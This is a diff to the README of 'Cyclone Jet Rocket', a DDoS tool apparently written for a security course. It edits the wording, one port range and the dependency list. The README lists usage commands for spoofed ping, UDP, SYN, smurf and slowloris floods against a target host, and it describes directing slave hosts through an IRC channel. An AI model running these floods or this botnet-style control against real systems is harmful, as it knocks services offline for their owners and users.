@@ -2,7 +2,7 @@
 
 Cyclone Jet Rocket is a DDoS tool for System Security Technology course.
 
-This DDoS tool provides more than 8 kinds of attack methods, each in one module, with different parameters each module.
+This DDoS tool provides more than 8 kinds of attack methods, each in one module, with different parameters each module. The abstraction of Layers is inspired from [gopacket](https://github.com/google/gopacket), but reimplemented by myself.
 
 ## Install
 
@@ -19,7 +19,7 @@ cjr --help
 cjr --list-module
 cjr --module ping-flood help
 cjr -m ping-flood --spoof 192.168.1.0/24 --destination 192.168.1.3 --rate 100/ms -c 100000
-cjr -m udp-flood -s 192.168.0.0/16 -d 192.168.1.3 -p 80 -p 22 -p 8000:8000 -r nolimit
+cjr -m udp-flood -s 192.168.0.0/16 -d 192.168.1.3 -p 80 -p 22 -p 8000:9000 -r nolimit
 cjr -m smurf --broadcast 192.168.1.255 -d 192.168.1.3 -c 1000
 cjr -m syn-flood -s 192.168.2.0/24 -d 192.168.1.3 -p 80 -r 100/s
 cjr -m slowloris --url http://www.example.com --request GET -c 100 -r 1/s --timeout 10
@@ -40,7 +40,7 @@ cjr -D --stop
 cjr -D --uninstall # this command will terminate the process on slave host and remove the executable file
 ```
 
-For convenience, we can also login the IRC channel to give the order. Something like below
+For convenience, we can also join the IRC channel to give the order. Something like below
 ```
 irssi
 /connect Freenode
@@ -52,5 +52,6 @@ irssi
 
 ## Dependencies
 
+- Go version 1.8 or above
 - [go-flags](https://github.com/jessevdk/go-flags)
 - [go-ircevent](https://github.com/thoj/go-ircevent)
